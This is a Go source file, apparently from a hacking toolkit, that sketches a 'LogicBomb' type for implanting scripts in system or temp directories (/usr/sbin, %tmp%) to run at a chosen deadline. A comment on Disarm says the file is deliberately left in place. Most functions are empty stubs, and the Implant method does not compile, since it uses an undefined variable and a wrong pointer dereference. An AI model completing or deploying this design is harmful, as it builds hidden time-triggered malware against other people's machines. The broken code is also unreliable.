package gohack

// Importing from standard golang libs...
import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"time"

	color "gohack/lib"
)

const (
	WindowsLocate string = `%tmp%`
	UnixLoacte    string = "/usr/sbin"
)

// LogicBomb ...
/*
A simple struct for logicbomb executed at time: Deadline.
A script: Script must be supplied
*/
type LogicBomb struct {
	BombID   string
	Deadline *time.Time
	Location string
	Script   [3]string // Mapping: [3]string{String-content, extension/type, commandline-execution-template}
}

func (lb *LogicBomb) Implant(location string, deadline time.Time, script [3]string) error {
	lb.BombID, _ = randomHex(32)
	lb.Location = location
	lb.Deadline = *deadline
	lb.Script = script

	fmt.Printf("%s[*] Implanting Logic Bomb...%s\n", color.ColorYellow, color.ColorReset)
	fmt.Printf("\t%sID: %s \n\tLocation: %s \n\tDeadline: %s\n\tScript: %v%s\n", color.ColorBlue, lb.BombID, ld.Deadline, ld.Location, ld.Script, color.ColorReset)

	// Actually implant the bomb ...
}

func (lb *LogicBomb) Arm() {
	// Arm the bomb...
}

func (lb *LogicBomb) Disarm() {
	// just remove the persistent processes...
	// dont actually remove the file
}

func Locate(bombID string) (path string) {
	return
}

func Remove(bombID string) int {
	return 0
}

func RemoveAll() {

}

func randomHex(n int) (string, error) {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}
